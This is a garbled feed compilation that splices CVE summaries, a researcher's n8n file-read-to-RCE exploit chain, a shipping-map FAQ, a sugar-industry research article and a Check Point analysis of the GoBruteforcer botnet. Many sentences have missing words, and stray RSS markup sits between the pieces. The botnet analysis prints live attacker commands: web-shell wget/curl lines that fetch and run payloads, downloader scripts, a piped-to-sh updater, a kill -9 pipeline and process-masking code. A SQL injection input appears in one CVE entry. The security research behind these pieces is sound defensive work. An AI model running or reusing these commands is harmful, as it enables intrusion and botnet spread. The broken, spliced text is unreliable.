Kanboard is project management software focused on Kanban methodology. Versions 1.2.48 and below is vulnerable to a critical authentication bypass when REVERSE_PROXY_AUTH is enabled. The application blindly trusts HTTP headers for user authentication without verifying the request originated from a trusted reverse proxy. An attacker can impersonate any user, including administrators, by simply sending a spoofed HTTP header. This issue is fixed in version 1.2.49.

llama.cpp is an inference of several LLM models in C/C++. In commits 55d4206c8 and prior, the n_discard parameter is parsed directly from JSON input in the llama.cpp server's completion endpoints without validation to ensure it's non-negative. When a negative value is supplied and the context fills up, llama_memory_seq_rm/add receives a reversed range and negative offset, causing out-of-bounds memory writes in the token evaluation loop. This deterministic memory corruption can crash the process or enable remote code execution (RCE). There is no fix at the time of publication.

ClipBucket v5 is an open source video sharing platform. Versions 5.5.2-#187 and below allow an attacker to perform Blind SQL Injection through the add comment section within a channel. When adding a comment within a channel, there is a POST request to the /actions/ajax.php endpoint. The obj_id parameter within the POST request to /actions/ajax.php is then used within the user_exists function of the upload/includes/classes/user.class. php file as the $id parameter. It is then used within the count function of the upload/includes/classes/db.class. php file. The $id parameter is concatenated into the query without validation or sanitization, and a user-supplied input like 1' or 1=1-- - can be used to trigger the injection. This issue does not have a fix at the time of publication.

 Jan. 8, 2026, 12:15 a.m. | 2 hours, 39 minutes ago
A vulnerability in the handling of verify_mode = CERT_REQUIRED in the wolfssl Python package (wolfssl-py) causes client certificate requirements to not be fully enforced. 

Because the WOLFSSL_VERIFY_FAIL_IF_NO_PEER_CERT flag was not included, the behavior effectively matched CERT_OPTIONAL: a peer certificate was verified if presented, but connections were incorrectly authenticated when no client certificate was provided. 

This results in improper authentication, allowing attackers to bypass mutual TLS (mTLS) client authentication by omitting a client certificate during the TLS handshake. 

The issue affects versions up to and including 5.8.2.

axios4go is a Go HTTP client library. Prior to version 0.6.4, a race condition vulnerability exists in the shared HTTP client configuration. The global `defaultClient` is mutated during request execution without synchronization, directly modifying the shared `http.Client`'s `Transport`, `Timeout`, and `CheckRedirect` properties. Impacted applications include that that use axios4go with concurrent requests (multiple goroutines, `GetAsync`, `PostAsync`, etc.), those where different requests use different proxy configurations, and those that handle sensitive data (authentication credentials, tokens, API keys). Version 0.6.4 fixes this issue.

 Jan. 7, 2026, 10:15 p.m. | 3 hours, 9 minutes ago
urllib3 is an HTTP client library for Python. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption. Starting in version 1.22 and prior to version 2.6.3, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client. Applications and libraries are affected when they stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects. Users should upgrade to at least urllib3 v2.6.3, in which the library does not decode content of redirect responses when `preload_content=False`. If upgrading is not immediately possible, disable redirects by setting `redirect=False` for requests to untrusted source.

LibreChat is a ChatGPT clone with additional features. Version 0.8.1-rc2 is prone to a server-side request forgery (SSRF)
vulnerability due to missing restrictions of the Actions feature in the default configuration. LibreChat enables users to configure agents with predefined instructions and actions that can interact with remote services via OpenAPI specifications, supporting various HTTP methods, parameters, and authentication methods including custom headers. By default, there are no restrictions on accessible services, which means agents can also access internal components like the RAG API included in the default Docker Compose setup. This issue is fixed in version 0.8.1-rc2.

Users should upgrade to version 1.121.0 or later to remediate the vulnerability.Unless you’ve been living under a rock for the last year, you’ve probably heard of . n8n is the go-to platform for building automated workflows in the age of AI and AI agents. With over 100 million Docker pulls, millions of users, and thousands of enterprises using it, n8n has become the central nervous system of automation infrastructure, and there’s a good chance your organization uses it too. n8n offers a friendly drag-and-drop interface and countless integrations that give any user , even the least technical - the ability to create automations and offload tasks. If you can imagine it, you can probably build it with n8n. In addition, it has a huge community that shares out-of-the-box workflows for all kinds of use cases.‍Before we dive into the technical details, I want to give some credit to the security team at n8n. They maintain a strong security posture across the product and respond incredibly fast when it comes to addressing reported vulnerabilities.This part is a little technical, so buckle up and enjoy the ride.A Webhook is a component that helps services become event-driven. Instead of constantly poking other applications and services to check if an event has occurred, it simply listens and waits for specific messages that indicate it.In n8n, Webhooks act as the starting point for workflows, letting you catch incoming data from Forms, Chat messages, WhatsApp notifications and more. ‍The execution flow for all Webhook nodes starts the same way, and that part isn’t really relevant to what we’re covering here, so let’s just call it the “Webhook Black Box.” After that, the flow calls a middleware function called  and the only thing that changes between different Webhooks is the actual logic function that gets called at the very end.‍To keep things clear, from now on, I’ll refer to Let's take a closer look at the middleware function.header to determine how to parse the request body. For  function. For all other content types, it uses . From now on I’ll refer to ”.To keep things focused, I won’t include the  source code. The key thing to understand is that this function parses the HTTP body based on the  header, then stores the decoded result in the . This function is simply a wrapper around Formidable’s  function  -  and this detail is crucial for understanding the vulnerability.Formidable (not the song)Formidable is a Node.js library built for handling file uploads. It parses requests and takes care of all the file upload mechanics  - including the security side of things. The security detail that matters here  -  when Formidable processes an uploaded file, it automatically saves it to a randomly generated path in a temp directory. This means users can’t control where files end up, which protects against path traversal attacks.with the output from Formidable.Handling uploaded files in n8nTo understand the vulnerability, we first need to look at how n8n handles file uploads. In n8n, the standard practice for any file-handling function is to fetch uploaded files directly from  Webhook is a good example of this pattern.This function first verifies that the  to process the uploaded files. from now on I’ll refer to The question is  - why does the function verify the content type? The reason is simple: the , like any other file-handling function in n8n, fetches data from . As we discussed earlier (, this variable is only populated by the , which only runs when the content type is Before we dive into the bug, let’s summarize what we know so farThe question is  - what happens if a file-handling function is called without verifying that the ? In the normal flow, the content type is still , so there’s no issue  -  legitimate users send the expected content type. But if an attacker changes the content type to something like , the middleware calls the won’t be populated  -  leading to an error.But here’s the real question: is this ‘Content-Type Confusion’ exploitable? Remember what we discussed earlier about how the “The key thing to understand is that this function parses the HTTP body based on the  header, then stores the decoded result in the So, what happens if the HTTP request body looks like this:As you’ve likely realized,  is populated with the decoded HTTP body content, and there’s nothing preventing What does this mean? If n8n has a flow where a file-handling function runs without verifying the content type is , an attacker can override  and control it completely  -  potentially leading to a vulnerability.So the big question: does such a flow exist? Spoiler alert  -  yes (otherwise you wouldn’t be reading this).The Form node is a useful node in n8n  -  it serves as the external interface for users to interact with workflows. You’ll find it in almost any workflow that needs user input. Think about HR systems where candidates upload their CVs, or customer support portals where users attach screenshots and error logs. File uploads are a core part of what makes it so flexible.The function that handles Form submissions is . It does a bunch of stuff we don’t need to worry about before calling As you can see, the form Webhook function calls  without verifying that the content type is .Now let’s see what this function actually does.This is a file-handling function that calls  function copies a file from its temp path (stored at req.body.files[id].filepath) to persistent storage -  either on disk or S3 object store, depending on the configuration.Here’s the issue: since this function is called without verifying the content type is That means we control the parameter  - so instead of copying an uploaded file, we can copy any local file from the system.The result? Any node after the Form node receives the local file’s content instead of what the user uploaded. Now let’s see how to exploit this.‍Organizational Knowledge-Base Use-CaseImagine this: You’re the Chief AI Officer at a large enterprise drowning in disorganized data - product documentation spread across drives, HR policies no one can find, financial reports locked in different systems. You want to make life easier for your employees, so you decide to create a centralized knowledge-base powered by RAG (Retrieval-Augmented Generation) technology that brings it all together. This use-case is far from fictional, as we see more and more organizations adopting this approach in their companies.The architecture is simple: any one of your employees can upload relevant data to the knowledge-base through Form, and retrieve data through a chat-based interface.To show you how the system would work, let’s pretend for a second you work as a Product Marketing Manager at a fictional company named  and you’re uploading product specification file to the organizational knowledge-baseNow your teammates and colleagues can search and get information about the product you’re offeringArbitrary File Read PrimitiveNow, let’s show how to exploit the ‘Content-Type confusion’ bug to read arbitrary files from the n8n instance. To trigger the vulnerability, we need to intercept the HTTP request sent when uploading a file through the Form and change the content-type from This forces the second parsing flow we discussed earlier (see . Then, we craft the request body to control the req.body.files[number].filepath, we’re essentially loading an internal file (in this example: ) into the organizational knowledge base instead of an uploaded one. To retrieve the content of that internal file, all we need to do is ask about it through the chat interface.As you can see, we were able to read  file from the n8n instance.From Arbitrary Read to RCESo now we know we can use this vulnerability to read arbitrary files from an n8n instance. But can we escalate this primitive to code execution? Again, the answer is yes - but first, we need to understand how n8n manages sessions.To keep things simple, I won’t include the full code here, but I’ll explain how n8n’s authentication session works. n8n stores the authentication session in a cookie called ``. ‍After successful login, n8n generates this cookie value through a specific process. First, it creates a dictionary containing key user details - the user ID and the first 10 characters of a SHA256 hash. This hash is computed from a string that concatenates the user’s email and password.Next, n8n signs this payload dictionary with a secret key (which is unique for each instance for security reasons). Finally, the signed output is stored in the session cookie named `Now that we understand how session management works, can we forge a fake session cookie if we have an arbitrary file read primitive? Luckily for us, all the elements needed to forge a valid session exist in local files on the n8n instance. First, the entire user records are stored in n8n’s database, which is stored locally on disk in local deployments (Docker, installation from source). For example, in Docker deployments, the database is located at /home/node/.n8n/database.sqliteSecond, the encryption secret key is stored in a configuration file, also stored locally in local deployments. The configuration location isLet’s demonstrate how we can use this vulnerability to perform an authentication bypass and log in as the system admin. First, we’ll trigger the vulnerability to load the entire database into the knowledge base.Right after that, we’ll use the chat interface to extract the admin’s user ID, email, and hashed password. Next, we’ll trigger the vulnerability again, but this time we’re loading the config file into the knowledge base. Once again, we’ll extract the encryption secret using the chat interface.To finish the job, we’ll use the algorithm we showed above to create the JWT hash, then set its value in the `And Voilà -  we’re logged in as admin. The Final Piece (Code Execution)Now, to achieve code execution, all we need to do is create a new workflow with a totally innocent node called "Execute Command”. And just like that - we've got code execution. Easy.The blast radius of a compromised n8n is massive. n8n connecting countless systems, your organizational Google Drive, OpenAI API keys, Salesforce data, IAM systems, payment processors, customer databases, CI/CD pipelines, and more. It’s the central nervous system of your automation infrastructure. Imagine a large enterprise with 10,000+ employees with one n8n server that anyone uses. A compromised n8n instance doesn’t just mean losing one system -  it means handing attackers the keys to everything. API credentials, OAuth tokens, database connections, cloud storage - all centralized in one place. n8n becomes a single point of failure and a goldmine for threat actors.Update n8n to version 1.121.0 or later.Don’t expose n8n to the internet unless absolutely necessary.Require authentication for all Forms you create.reported the vulnerability to n8n.n8n acknowledged the report.n8n published patched versionThe researcher requested an update regarding the publication status of the vulnerability report Cyera published this blog post.]]></content:encoded></item><item><title>US Job Openings Decline to Lowest Level in More Than a Year</title><link>https://www.bloomberg.com/news/articles/2026-01-07/us-job-openings-decline-to-lowest-level-in-more-than-a-year</link><author>toomuchtodo</author><category>dev</category><pubDate>Wed, 7 Jan 2026 15:32:44 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2026-22542 - DENIAL OF SERVICE FOR CONCURRENT CONNECTIONS ON TELNET</title><link>https://cvefeed.io/vuln/detail/CVE-2026-22542</link><author></author><category>vulns</category><pubDate>Wed, 7 Jan 2026 15:24:04 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2026-22542

You can also see a few statistics such as a counter for emitted CO (in thousand tonnes) and maximum freight carried by represented vessels (varying units).You can pan and zoom in the usual ways, and skip back and forward in time using the timeline at the bottom of the screen.

There are also controls for filtering and colouring by vessel type.What the are types of ships shown?The merchant fleet is divided into five categories, each of which has a filter and a CO and freight counter for the hour shown on the clock. The ship types and units are as follows:Container (e.g. manufactured goods): number of container slots equivalent to 20 feet (i.e. a 40-foot container takes two slots)Dry bulk (e.g. coal, aggregates): combined weight of cargo, fuel, water, provisions, passengers and crew a vessel can carry, measured in thousand tonnesTanker (e.g. oil, chemicals): same as dry bulkGas bulk (e.g. liquified natural gas): capacity for gases, measured in cubic metresVehicles (e.g. cars): same as dry bulkWhy do ships sometimes appear to move across land?In some cases this is because there are ships navigating via canals or rivers that aren’t visible on the map. Generally, though, this effect is an artefact of animating a ship between two recorded positions with missing data between, especially when the positions are separated by a narrow strip of land. We may develop the map to remove this effect in the future.Why are there fewer ships visible in the first part of the year?Unfortunately the data we are using for the map is incomplete for the first few months of the year: roughly January to April.Website: Duncan Clark & Robin Houston from KilnData: Julia Schaumeier & Tristan Smith from the UCL EIUCL EI took data showing location and speed of ships and cross-checked it with another database to get the vessel characteristics, such as engine type and hull measurements.

Kiln took the resulting dataset and visualized it with WebGL on top of a specially created base map, which shows bathymetry (ocean depth), based on the GEBCO_2014 Grid (version 20150318), as well as continents and major rivers from Natural Earth.Where did you get the data and who paid?If you want to have an installation in your foyer, museum, living room, you can contact us at .

The trade organization represented 30 international members.Meanwhile, evidence linking sugar consumption to high blood cholesterol and triglyceride levels – both thought to be risk factors for coronary heart disease – began to emerge in the scientific literature and popular press.Literature Shaped Public OpinionAfter a 1965 spike in media attention to the heart disease risks of sucrose, the sugar industry commissioned Project 226, a literature review written by researchers at the Harvard University School of Public Health Nutrition Department, which was published in the highly respected (NEJM) in 1967. It concluded there was “no doubt” that the only dietary intervention required to prevent coronary heart disease was to reduce dietary cholesterol and substitute polyunsaturated fat for saturated fat in the American diet.


Cristin Kearns, DDS, MBA


“The literature review helped shape not only public opinion on what causes heart problems but also the scientific community’s view of how to evaluate dietary risk factors for heart disease,” said lead author Cristin Kearns, DDS, MBA, who discovered the industry documents.The UCSF researchers analyzed more than 340 documents, totaling 1,582 pages of text, between the sugar industry and two individuals: Roger Adams, then a professor of organic chemistry who served on scientific advisory boards for the sugar industry; and D. Mark Hegsted, one of the Harvard researchers who produced the literature review.To conduct the literature review, the sugar industry paid the Harvard scientists the equivalent of $50,000 in 2016 dollars, then set the review’s objective, contributed articles to be included, and received drafts. Yet the industry’s funding and role were not disclosed in the final NEJM publication.The literature review heavily criticized studies linking sucrose to heart disease, while ignoring limitations of studies investigating dietary fats. The review argued that blood cholesterol levels were the only significant risk factor for coronary heart disease, which made the high sucrose content of the American diet seem less hazardous than if blood triglycerides were also considered to be a risk factor.Need for More Transparent Scientific Reviews


Stanton A. Glantz, PhD


The authors emphasized that this analysis demonstrates the importance of having scientific reviews written by people without conflicts of interest, as well as the need for financial disclosure in nutrition science.“As the saying goes, he who pays the piper calls the tune,” said senior author Stanton A. Glantz, PhD, UCSF professor of medicine and director of the UCSF Center for Tobacco Control Research and Education. “There are all kinds of ways that you can subtly manipulate the outcome of a study, which industry is very well practiced at.”Co-author Laura Schmidt, PhD, who is also principal investigator on the UCSF-led SugarScience initiative, noted that after decades of focusing on saturated fat as the dietary culprit in heart disease, the science is building around sugar’s role, but health policy has only just begun to catch up.


Laura Schmidt, PhD


“There is now a considerable body of evidence linking added sugars to hypertension and cardiovascular disease, which is the No. 1 cause of premature death in the developed world,” Schmidt said. “Yet, health policy documents are still inconsistent in citing heart disease risk as a health consequence of added sugars consumption.”The study was funded by the UCSF Philip R.

The botnet spreads through a chain of web shell, downloader, IRC bot, and bruteforcer modules.The current wave of campaigns is driven by two factors: the mass reuse of AI-generated server deployment examples that propagate common usernames and weak defaults, and the persistence of legacy web stacks such as XAMPP that expose FTP and admin interfaces with minimal hardening.According to our estimate, more than 50,000 Internet-facing servers may be vulnerable to GoBruteforcer attacks.Check Point Research (CPR) observed a GoBruteforcer campaign targeting databases of crypto and blockchain projects. On one compromised host, we recovered Go-based tools, a TRON balance scanner and TRON and BSC “token-sweep” utilities, together with a file containing ~23,000 TRON addresses. On-chain transaction analysis involving the botnet operators’ recipient wallets shows that at least some of these financially motivated attacks were successful.GoBruteforcer is a botnet that turns compromised Linux servers into scanning and password brute-force nodes. It targets internet-exposed services such as phpMyAdmin web panels, MySQL and PostgreSQL databases, and FTP servers. Infected hosts are incorporated into the botnet and accept remote operator commands.  Newly discovered weak credentials are used to steal data, create backdoor accounts, sell access, and expand the botnet.The malicious toolkit is usually split into two parts. The first is an IRC bot that enables remote control of the compromised host, including command execution and updates. The second is a bruteforcer that is fetched later and used to scan random public IP ranges and attempt logins using credentials that are hardcoded or provided by the command and control (C2) server.The botnet was first described publicly in 2023. In mid-2025, we  began observing a more sophisticated GoBruteforcer variant in the wild. This new variant introduces a heavily obfuscated IRC bot (rewritten entirely in Go), improved persistence mechanisms, process-masking tricks, and server dynamic credential lists.This article summarizes what we know about the 2025 variant, highlights its new features, and provides a broader context of misconfigured servers, weak credentials, and AI-assisted DevOps workflows.Millions of database and file-transfer servers are publicly reachable on their default ports. Recent data from Shodan (a search engine for internet-connected devices and services) show roughly 5.7 million FTP servers, 2.23 million MySQL servers, and about 560 thousand PostgreSQL servers are exposed to the Internet. — Number of MySQL servers publicly reachable on the default port (Source: Shodan search).These services, together with tens of thousands of phpMyAdmin panels, form the primary attack surface for GoBruteforcer.We compared the credential list used in GoBruteforcer campaigns against a database of approximately 10 million leaked passwords and found an overlap of roughly 2.44%. This gives us a baseline for a rough upper limit on the number of hosts that might accept one of the passwords that GoBruteforcer has at its disposal: approximately 54.6 thousand MySQL instances and 13.7 thousand PostgreSQL instances (note that this estimate does not account for correct usernames, host-based access restrictions, or other policy controls). Even with a low success rate, the large number of exposed services makes this type of attack an economically-attractive option. Our assumptions are supported by Google’s 2024 Cloud Threat Horizons report, which found that weak or missing credentials accounted for 47.2% of initial access vectors in compromised cloud surfaces. In practice, attackers do not need expensive techniques or zero-day exploits to gain access. They can simply try common usernames and passwords such as ,  or  until they obtain access (the bruteforce model). The evidence shows that this approach still succeeds far too often.Drivers of the current waveFor GoBruteforcer to succeed, the attackers must guess not only a weak password but also a valid username that accepts remote logins. In our monitoring of the botnet, we observed that real GoBruteforcer attacks use common operational usernames such as  and  in their brute-force credential lists: — Sample credential lists delivered by GoBruteforcer C2 for brute-force tasks.The use of these names in attacks is not accidental. Most have circulated for years in database tutorials, vendor documentation, and community Q&A as convenient examples, many of which were copied into production environments.Large language models (LLMs) are trained on this same public documentation and example code. It is therefore not surprising that they often reproduce the same configuration samples with popular default usernames like  and . We asked two mainstream LLMs to help us create a MySQL instance in Docker. Both produced near-identical snippets with stock username patterns: — Example snippets generated by different models for deploying MySQL in Docker.AI clearly boosts productivity and lowers the barrier to entry: a person with little operational experience can use an AI assistant to create a database server in Docker in minutes. However, blindly following AI-provided instructions carries security risks as it leads to even wider use of standard configurations with common usernames in production. Although we do not think that GoBruteforcer specifically targets AI-assisted server installations, the widespread use of LLMs may help the botnet’s attacks become more successful.The second driver for GoBruteforcer attacks is legacy web server software stacks such as XAMPP, which still power a considerable number of websites. These installations often ship with a preinstalled FTP server and default credentials (often without the administrator’s awareness) which serve as a functional backdoor waiting to be exploited.Campaign patterns and targetingGoBruteforcer targets four service types: FTP, MySQL, PostgreSQL, and phpMyAdmin.The C2 server determines which service to attack, and also transmits a list of 200 credentials for the brute-force attack. The campaign profile, which includes the target and username and password sets, is rotated through several times per week. Within one campaign, the per-task password lists are newly created each time from a relatively small database, typically 375–600 commonly used weak passwords.We observed broad spray campaigns and more focused runs. In generic sprays, the botnet operator uses a list of common operational usernames (, , , , , , , , , ,  and others) and a standard weak-password base, sometimes with light username-flavored variants (for example  or ).Some tasks are clearly sector-focused. For example, we observed an attack that used crypto-themed usernames such as , , , and . In these runs, the passwords used combined the standard weak list with crypto-specific guesses such as  or .Other campaigns target phpMyAdmin panels, often associated with WordPress sites. These attacks use a short username list: , , and . The attackers supplement the common weak-password set with WordPress-style variants like ,  and .We also observed username-focused runs that apply the full password pool to a single username such as  or ).  Different single-username tasks are distributed across the botnet, so it is likely that many account names are tested in parallel.To summarize, the attackers  reuse a small, stable password pool for each campaign, refresh per-task lists from that pool, and rotate usernames and niche additions several times a week to pursue different targets.Unlike the other services, FTP brute-force uses a small, hardcoded set of credentials embedded in the bruteforcer binary. That built-in set points to web-hosting stacks and default service accounts, as many usernames and passwords map to known defaults used by bundled distributions (notably XAMPP) and common web server deployments (e.g., , , , , -style entries).Attackers can use the discovered weak passwords to further spread the botnet (this may be possible in case of a successful compromise of WordPress) as well as steal sensitive data from compromised databases and sell access.We observed GoBruteforcer activity both in the wild and in dedicated honeypots. The data we collected show common initial access patterns that we saw repeatedly in campaigns and honeypot captures.See Figure 4 for the attack chain: — GoBruteforcer infection chain.A notable vector for initial compromise is internet-exposed FTP on servers running XAMPP. XAMPP is a widely used, easy-to-install Apache product that bundles Apache, MySQL/MariaDB, PHP/Perl, an FTP server (typically ProFTPD) and phpMyAdmin. By default, XAMPP is installed under , and the web content directory  is available on the web server. It’s designed for a local development environment and convenient installation rather than maximal security. As a result, it contains default weak passwords unless the administrator runs XAMPP’s security helper. In addition, the default ProFTPD configuration on XAMPP commonly maps the FTP root to that same webroot, which means a successful FTP login enables attackers to write files that are then implemented by the web server.At the same time, the small set of credentials used by the FTP bruteforcer strongly indicates that XAMPP installations are among GoBruteforcer’s intended targets. When attackers obtain access to XAMPP FTP using a standard account (commonly  or ) and a weak default password, the typical next step is to upload a web shell into the webroot.To upload a web shell, attackers may also use other vectors, for example, misconfigured MySQL servers or phpMyAdmin panels. Published case studies and write-ups demonstrate practical techniques for achieving code execution or uploading shells through phpMyAdmin when the application or host is misconfigured.The attackers still use the same PHP web shell that we observed two years earlier (: de7994277a81cf48f575f7245ec782c82452bb928a55c7fae11c2702cc308b8b). In addition, the samples we observed use the same hashed password for user authentication.We also suspect the presence of other distribution chains, as we found hosts belonging to the botnet that did not have a web shell installed.The web shell installed in the previous step is then used to download and execute additional malicious software (such as an IRC bot).We observed web shell commands that instruct the target to fetch and run an architecture-specific payload. Example (as seen in the web server access logs):<webshell>.php?dmc=(wget -qO - http[:]//<compromised_host_ip>/.x/?x=x86 || curl http[:]//<compromised_host_ip>/.x/?x=x86)The fetched payload is a small shell script:#!/bin/sh
if [ ! -w . ] || [ ! -x . ]; then
    cd /tmp || exit 1
fi

if [ `md5sum init_start 2>&1 | awk '{print $1}'` != "cc9dde367a1e7ac2c1a7611bdfbbcbc3" ] ; then
    rm -rf init_start
    (wget -q -O init_start http[:]//<compromised_host_ip>/.x/x_x86 || curl 
-[s] -[L] -[o] init_start http[:]//<compromised_host_ip>/.x/x_x86)
fi

chmod +x init_start
./init_startThis shell script functions as a lightweight downloader and updater. It first ensures it can write and execute in the current directory; if not, it switches to  (or exits if that also fails). It then checks the MD5 of the local  file and, on mismatch or absence, deletes any existing file, downloads a fresh copy from a remote host via  or , saving the downloaded file as , makes it executable, and runs the script.The remote server (on request to ) selects the IRC bot binary to return, based on an architecture parameter. The following architectures are supported:, , , , Depending on the compromised host configuration and the privileges obtained by the attackers, a newly infected machine can play different roles within the botnet: Most commonly, the host runs the bruteforcer and scanners that enumerate and attempt password logins across the Internet. A compromised device may be used to host and serve payloads to other compromised systems (as the  in the previous examples). In some cases, an infected host can be promoted to host IRC-style control endpoints or act as a backup C2 for resilience.This modularity increases the botnet’s resilience. The botnet operators can control bots via web shells and also via the installed IRC bot (post-deployment control). The presence of built-in lists of fallback C2 addresses and the ability to update the IRC bot module (and switch to alternate servers) enables continuous control even when parts of the infrastructure are disrupted. We also observed a domain-based fallback mechanism: bots first keep trying hardcoded IP endpoints and only attempt C2 domain resolution if all hardcoded servers are unresponsive. This way, the bot reduces accidental domain lookups during normal operation but allows a last-resort recovery path if the infrastructure changes.Post-infection control and module updatesAfter the IRC bot connects to the C2 server, the attackers gain an additional channel for managing the newly infected host. The bot’s full functionality and the control protocol are described in detail in the  section below.Most commands are issued on a shared IRC channel, so many bots receive identical instructions simultaneously. One common action is to instruct bots to download or update the bruteforcer module; this update typically occurs twice a day using the following shell command:(wget -qO - "http[:]//<compromised_host>/.x/test2.php?x=`uname -m`" || curl -[sL] "http[:]//<compromised_host>/.x/test2.php?x=`uname -m`") | sh > /dev/null 2>&1 &This pipeline fetches and executes a shell script produced by . The  substitution returns the host architecture (for example, ), and  generates an architecture-specific downloader script similar to the one described earlier. The downloader only retrieves the bruteforcer binary for the selected architecture if a local copy is missing or its MD5 checksum differs from the expected value. It saves the downloaded file in the  folder under the name .This is an example of the downloader script we observed:#!/bin/sh
cd /tmp

if [ `md5sum init_stop 2>&1 | awk '{print $1}'` != "2c32ba61a6ac6721ed6f5a76b1fcbd7a" ] ; then
    rm -rf init_stop
    (wget -q -O init_stop http[:]//<compromised_host>/.x/s_x64 || curl -[sL] -o init_stop http[:]//<compromised_host>/.x/s_x64)
fi

chmod +x init_stopEvery 400 seconds, the bot receives the command  to launch the downloaded file: — Bruteforcer restart command.Approximately every 5,000 seconds, we also observed a command to find and stop bruteforcer processes:ps x | grep init_stop | grep -v grep | grep -v export | awk -F" " '{print $1}' | xargs kill -9
In addition, this command enables the attackers to terminate any processes that contain  in the command line and are running under the same user account. Using  ensures an immediate, forced shutdown of those PIDs, including the bruteforcer itself and tools launched with a command line that references  (for example, a debugger started as ).Detecting hosting providers (OVH / DigitalOcean)We observed the botnet operators issuing checks using ipinfo.io to identify whether compromised hosts belong to specific providers. We observed several variants of the command, including one with a typo  that indicates interactive execution rather than a scripted check:wget -qO- ipinfo.io/org | grep-i digitalocean
wget -qO- ipinfo.io/org | grep -i digitalocean
wget -qO- ipinfo.io/org | grep -i ovh
wget -qO- ipinfo.io/org | grep -i amazon
These simple lookups with ipinfo.io return the organization name for the host’s public IP address and allow the attackers to detect provider tenancy. We observed  probes for  and  as interactive commands in our logs, indicating that the botnet operators occasionally manually inspect host provider metadata.Later in the process, we also observed another command sequence intended to build a list of bots running outside datacenters and to filter out likely honeypots by excluding hosts that report as VPNs, proxies, or Tor. The attackers also ran these commands interactively and likely without prior testing: the first command failed due to a missing space in the grep invocation.wget -qO- <https://api.ipapi.is> | grep -q '"is_datacenter":false' && grep -q '"is_vpn":false' && grep -q '"is_proxy":false' && grep -q '"is_tor":false' && echo "Residential"
wget -qO- <https://api.ipapi.is> | grep -cE '"is_(datacenter|vpn|proxy|tor)": false' | grep -q '^4$' && echo Residential
Possible operational rationales behind these queries include:Target selection or exclusion: Some providers may be treated differently, for example, avoid or deprioritize cloud providers that have active abuse/honeypot programs or rapid takedown procedures.Tagging & grouping: The botnet operators may label bots (by provider or datacenter) for later targeting.Follow-up actions: Different post-exploitation strategies (e.g. promotion to distribution/C2 node) may be chosen based on provider characteristics.As we stated previously, during monitoring we noted that credential sets used in GoBruteforcer campaigns included crypto-themed usernames, suggesting an interest in poorly secured blockchain databases. We later found corroborating evidence on one compromised host: alongside the botnet binaries, the attackers  placed additional modules that matched the group’s tooling profile (written in Go and UPX-packed). — Exposed directory listing on a compromised host controlled by the attackers.One module iterates TRON blockchain addresses and query balances to identify accounts with non-zero funds. We found a data file next to the binary that contains approximately 23,000 TRON addresses:TRL3xEyaGe2CbHbLFKh13e35dPjdUDwESt

...
The module queried the service  using several API keys to perform lookups: — Tronscan API keys used by the operators.We also discovered “token-sweep” utilities for Binance Smart Chain (BSC) and TRON, also written in Go and UPX-packed. Their purpose is to use private keys to transfer tokens from victim addresses to attacker-controlled wallets. We did not find private keys on this host. It is plausible that keys were supplied at runtime and deleted after the operation was complete.We assume that the operation could be run in parallel across multiple infected hosts, and we observed only one such node where the attackers apparently forgot to delete the files.From the binaries, we also extracted two of the target blockchain wallet addresses utilized by the attackers:: TF5LUPC7MQWMcCgRLThY1v8zsHuoz1sBZW: 0x208a8Ce726443B7ED9B621be70Cee7b2bB6723B2Based on on-chain transaction review of these recipient wallets and the contents of the recovered address list, we determined with moderate confidence that the compromised database likely belonged to an older or legacy blockchain product (e.g., a custodial wallet service). Most addresses carried only small residual balances, consistent with leftover funds rather than actively used accounts. — Token-sweep transactions to the operators’ wallet on TRON.IRC Bot technical detailsIn this section, we analyze the current (2025) version of the IRC bot used in the botnet to control infected hosts and deploy the GoBruteforcer.As in the old version, the malicious binary is packed with UPX. However, the packer’s  signature bytes were replaced by : — Patched “UPX!” signature in the analyzed sample.Once those bytes are patched back to their original state, standard UPX successfully unpacks the sample.Previously, the bot was likely written in C and only the bruteforcer component was implemented in Go. Now, all samples used by the group are written in Go, including the IRC bot.In addition, all samples are obfuscated with Garbler, which complicates the analysis because the binaries no longer contain plaintext strings.The bot’s functionality also changed in several ways:The algorithm for generating the IRC nickname was modified. The host name appended to the nickname is now less predictable — instead of replacing invalid characters with the literal string , the new code uses a regular expression that simply strips or replaces forbidden characters.An older version of the bot used the IRC command , which causes the bot to become visible on the server. That command was removed in the new version.The command handler was rewritten and the set of supported commands was expanded.Process masking features were added.Below we examine the new and changed functionality in more detail, including aspects that were not documented previously.The malware attempts to hide its presence on the host in two ways: by changing the  and by overwriting the .To change the short process name, the malware calls  with the  operation. Before the call, it truncates the supplied name so that it fits into the 16-byte kernel buffer used for the thread “comm” field. The following C-style pseudocode illustrates that technique:int set_proc_name(const char *name)
    char buf[16];
    size_t n = name ? strlen(name) : 0;
    if (n > 15) n = 15;
    memcpy(buf, name, n);
    buf[n] = '\\0';
    // PR_SET_NAME == 15
    if (prctl(15 /*PR_SET_NAME*/, (unsigned long)buf, 0, 0, 0) == -1) {
        return -errno;
    }
    return 0;
}
In the observed sample, the fake process name used is . As a result, utilities such as System Monitor display that value instead of the real executable name — a behavior that helps the binary blend in with legitimate system processes: — System Monitor shows the altered process name.The previous method for changing the process name does not affect the command line shown by many tools (for example, ). To mask the malicious process in the output of these tools, the malware also overwrites the in-memory  buffer so that  contains the fake label (and trailing zero bytes) instead of the original command line.The sample first reads  to learn the actual visible length of the command line. It then retrieves the pointer to the  buffer. If the chosen label ( in the analyzed sample) is longer than that available space, the code falls back to a one-byte label (). Finally, it constructs the label plus NUL padding to match the original visible length and writes those bytes in place in the  buffer. The C-pseudocode below mirrors this routine:void maskCmdline(char *label) {
    ssize_t cmdlen = read_len("/proc/self/cmdline");
    void *dst; int cap;
    get_argv0_buf(&dst, &cap);
    if (!dst || cap <= 0 || cmdlen <= 0) return;

    int used = strlen(label);
    if (used > cap) { label = "x"; used = 1; }

    int pad = cmdlen - used;
    if (pad < 0) pad = 0;

